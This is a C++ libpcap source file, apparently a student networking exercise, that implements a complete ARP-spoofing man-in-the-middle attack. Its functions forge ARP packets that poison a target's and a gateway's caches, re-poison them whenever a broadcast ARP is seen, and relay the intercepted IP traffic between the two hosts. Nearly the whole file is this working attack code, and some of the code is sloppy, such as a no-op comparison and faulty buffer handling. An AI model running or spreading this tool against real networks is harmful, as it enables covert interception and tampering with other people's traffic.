#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string>
#include "sub.h"
#include <netinet/ip.h>
//#include <pthread.h>
#include <thread>
#include "iphdr.h"

using namespace std;
#pragma pack(push, 1)

typedef struct tTREAD{                          
	pcap_t* handle_;
	char *target_mac_;
	char* tip;
	char* sip;
	char* gateway_mac;
	
} params;
typedef struct mac_addr{
	pcap_t* handle_;
	char* gateway_mac;
	char* target_mac;
	char* gateway_ip;
	char* target_ip;
	const char* my_mac;
} mac_addr;
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthPacket {
	EthHdr eth_;
	IpHdr ip_;
	
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> gateway_ip target_ip\n");
	printf("sample: send-arp-test wlan0\n");
}

string get_mac_address(void)
{
    int socket_fd;
    int count_if;
    struct ifreq *t_if_req;
    struct ifconf t_if_conf;
    char arr_mac_addr[17] = {
        0x00,
    };
    memset(&t_if_conf, 0, sizeof(t_if_conf));
    t_if_conf.ifc_ifcu.ifcu_req = NULL;
    t_if_conf.ifc_len = 0;
    if ((socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
    {
        return "";
    }
    if (ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0)
    {
        return "";
    }
    if ((t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL)
    {
        close(socket_fd);
        free(t_if_req);
        return "";
    }
    else
    {
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req;
        if (ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0)
        {
            close(socket_fd);
            free(t_if_req);
            return "";
        }
        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for (int idx = 0; idx < count_if; idx++)
        {
            struct ifreq *req = &t_if_req[idx];
            if (!strcmp(req->ifr_name, "lo"))
            {
                continue;
            }
            if (ioctl(socket_fd, SIOCGIFHWADDR, req) < 0)
            {
                break;
            }
            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]);
            break;
        }
    }
    close(socket_fd);
    free(t_if_req);
    return arr_mac_addr;
}
int get_target_mac(pcap_t*handle,char* target_mac, char* sip, char* tip){
	//printf("get_target_mac_func\n");
	char gateway[20];
	
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(get_mac_address().c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(get_mac_address().c_str());
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.arp_.tip_ = htonl(Ip(tip));
	



	const u_char* packet_data;
	
	struct ip* iph;
	struct libnet_ethernet_hdr* mac;

	for(int j = 0; j < 100; j++)
	{
	
	
	struct pcap_pkthdr* header;
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	




	
	
	res = pcap_next_ex(handle,&header, &packet_data);

        //if (res == 0) continue;

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {

            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
            

        }
    
    mac = (struct libnet_ethernet_hdr *)packet_data;
	int i = 0;
	
	char tmp[10];
	
	
	
	i = 0;
		memset(target_mac,0,20);
        while(i < 6){
		sprintf(tmp,"%02x:",mac->ether_shost[i]);
		
		strcat(target_mac,tmp);
		if((i+1) == (5))
		{
			sprintf(tmp,"%02x",mac->ether_shost[++i]);
			strcat(target_mac,tmp);
		}
		i++;
	}
	
	iph = (struct ip*)(packet_data+sizeof(struct libnet_ethernet_hdr) + 2);
	
	if(strcmp(inet_ntoa(iph->ip_src),tip) == 0 && strcmp(target_mac,get_mac_address().c_str()) !=0)
	{
		break;
	}
	
	
	
	
		

	}

	printf("ip addr -> %s\n",inet_ntoa(iph->ip_src));
	printf("mac addr -> %s\n", target_mac);
	
	return 0;
}
void infect_target(pcap_t*handle,char* target_mac, char* sip, char* tip)
{
	
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(target_mac);
	packet.eth_.smac_ = Mac(get_mac_address().c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(get_mac_address().c_str());
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac(target_mac);
	packet.arp_.tip_ = htonl(Ip(tip));
	
	
	struct pcap_pkthdr* header;
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		
	
	}
	
	
}
void attack(params* param)
{	
	//printf("attack_func\n");
	//params param = parammm
	//reinterpret_cast<params*>(param);
	get_target_mac(param->handle_,param->target_mac_,param->sip, param->tip);
	//printf("middle");
	infect_target(param->handle_, param->target_mac_, param->sip, param->tip);

}
void attack3(params* param)
{	
	
	//printf("attack3_func\n");
	//params param = parammm
	//reinterpret_cast<params*>(param);
	
	//printf("middle");
	infect_target(param->handle_, param->target_mac_, param->sip, param->tip);
}
void* re_attack(params*param,params*param2)
{
	
	struct pcap_pkthdr* header;
	const u_char* packet_data;
	struct ip* iph1;
	struct libnet_ethernet_hdr* mac1;
	

	

	while(1)
	{
		
		int re_res = pcap_next_ex(param->handle_,&header, &packet_data);
		 mac1 = (struct libnet_ethernet_hdr *)packet_data;
		 char type[4];
		 sprintf(type,"0%x",mac1->ether_type);
		 
		 char dst_mac[20];
		 
		 int i = 0;
	
		char tmp[10];
		 i = 0;
		memset(dst_mac,0,20);
        while(i < 6){
		sprintf(tmp,"%02x:",mac1->ether_dhost[i]);
		
		strcat(dst_mac,tmp);
		if((i+1) == (5))
		{
			sprintf(tmp,"%02x",mac1->ether_dhost[++i]);
			strcat(dst_mac,tmp);
		}
		i++;
		}
		dst_mac[i] == '\0';
		//printf("%s\n",dst_mac);
		
		
		
		
		if(strcmp(type,"0608") == 0 && strcmp(dst_mac,"ff:ff:ff:ff:ff:ff") == 0)
		{
			printf("re_attack\n");
			
			infect_target(param->handle_, param->target_mac_, param->sip, param->tip);
			infect_target(param2->handle_, param2->target_mac_, param2->sip, param2->tip);
		}
		
		
	}
}


void relay_packet(mac_addr*macs){
	//printf("relay_packet_func");
	
	printf("connection,,,,\n");
	char s_mac[20];
	char d_mac[20];

	while(1)
	{
	struct pcap_pkthdr* header;
	const u_char* packet_data;
	int res = pcap_next_ex(macs->handle_,&header, &packet_data);
	

	struct ip* iph;
	struct libnet_ethernet_hdr* mac;
    mac = (struct libnet_ethernet_hdr *)packet_data;
    
	char tmp[10];
	
	int i = 0;
	
	
	
	
		i = 0;
		memset(s_mac,0,20);
        while(i < 6){
		sprintf(tmp,"%02x:",mac->ether_shost[i]);
		
		strcat(s_mac,tmp);
		if((i+1) == (5))
		{
			sprintf(tmp,"%02x",mac->ether_shost[++i]);
			strcat(s_mac,tmp);
		}
		i++;
	}
	//s_mac[i] = '\0';
	i = 0;
		memset(d_mac,0,20);
        while(i < 6){
		sprintf(tmp,"%02x:",mac->ether_dhost[i]);
		
		strcat(d_mac,tmp);
		if((i+1) == (5))
		{
			sprintf(tmp,"%02x",mac->ether_dhost[++i]);
			strcat(d_mac,tmp);
		}
		i++;
	}
	//d_mac[i] = '\0';

	iph = (struct ip*)(packet_data+sizeof(struct libnet_ethernet_hdr));
	
	/*
	printf("smac = %s\n",s_mac);
	printf("dmac = %s\n",d_mac);
	printf("sip = %s\n", inet_ntoa(iph->ip_src));
	printf("dip = %s\n", inet_ntoa(iph->ip_dst));
	printf("type = %d\n",mac->ether_type);
	printf("my_mac - %s\n",macs->my_mac);
	printf("targetip = %s\n",macs->target_ip);
	printf("gateway_ip = %s\n",macs->gateway_ip);
	*/
	struct EthPacket* packet;
	packet = (struct EthPacket*)packet_data;
	
	if(mac->ether_type == 8 && strcmp(d_mac, macs->my_mac) == 0 && strcmp(inet_ntoa(iph->ip_dst), macs->target_ip) == 0)
	{
		//printf("me -> target\n");
		packet->eth_.smac_= Mac(macs->my_mac);
		packet->eth_.dmac_ = Mac(macs->target_mac);
		//printf("target_mac = %s\n",macs->target_mac);
		//printf("len = %d\n",header->len);
		int res = pcap_sendpacket(macs->handle_, reinterpret_cast<const u_char*>(packet), header->caplen);
		if (res != 0) {
			printf("len = %d\n",header->len);
	printf("caplen = %d\n",header->caplen);
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(macs->handle_));
		
	
	}


	}
	else if(mac->ether_type == 8 && strcmp(d_mac, macs->my_mac) == 0 && strcmp(inet_ntoa(iph->ip_dst), macs->gateway_ip) == 0)
	{
		//printf("me -> gateway\n");
		packet->eth_.smac_ = Mac(macs->my_mac);
		packet->eth_.dmac_  = Mac(macs->gateway_mac);
		int res = pcap_sendpacket(macs->handle_, reinterpret_cast<const u_char*>(packet),header->caplen);
		if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(macs->handle_));
		printf("len = %d\n",header->len);
		printf("caplen = %d\n",header->caplen);
	
	}
	}
	//printf("\n");
}	


}
void attack2(params* param)
{	
	//printf("attack2_func\n");
	while(1)
	{
	//params param = parammm
	//reinterpret_cast<params*>(param);
	
	//printf("middle");
	infect_target(param->handle_, param->target_mac_, param->sip, param->tip);
	}
}

int main(int argc, char* argv[]) {
	/*
	if (argc != 2) {
		usage();
		return -1;
	}
	*/
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle1 = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	pcap_t* handle3 = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	pcap_t* handle4 = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	
	char mac_addr_1[20] = {0,};
	char mac_addr_2[20] = {0,};
	params param1;
	param1.target_mac_= mac_addr_1;
	param1.handle_ = handle1;
	param1.sip = argv[2];
	param1.tip = argv[3];
	
	params param2;
	param2.target_mac_ = mac_addr_2;
	param2.handle_ = handle1;
	param2.sip = argv[3];
	param2.tip = argv[2];

	


	
	attack(&param1);
	attack(&param2);

	char mac_tmp[20] = {0,};
	mac_addr macs;
	macs.handle_ = handle2;
	macs.gateway_mac = param2.target_mac_;
	macs.target_mac = param1.target_mac_;
	macs.gateway_ip = argv[2];
	macs.target_ip = argv[3];

	params param3;
	param3.target_mac_=param1.target_mac_;
	param3.handle_ = handle3;
	param3.sip = argv[2];
	param3.tip = argv[3];
	
	params param4;
	param4.handle_ = handle4;
	param4.target_mac_ =  param2.target_mac_;
	param4.sip = argv[3];
	param4.tip = argv[2];

	sprintf(mac_tmp,"%s",get_mac_address().c_str());
	macs.my_mac = mac_tmp;
	
	thread t1(re_attack,&param1,&param2);
	
	
	thread t3(relay_packet,&macs);
	//thread t4(attack2,&param3);
	//thread t5(attack2,&param4);
	t3.join();
	t1.join();
	//t4.join();
	//t5.join();
	
	pcap_close(handle1);
	pcap_close(handle2);
	pcap_close(handle3);
	pcap_close(handle4);
	
	return 0;

}
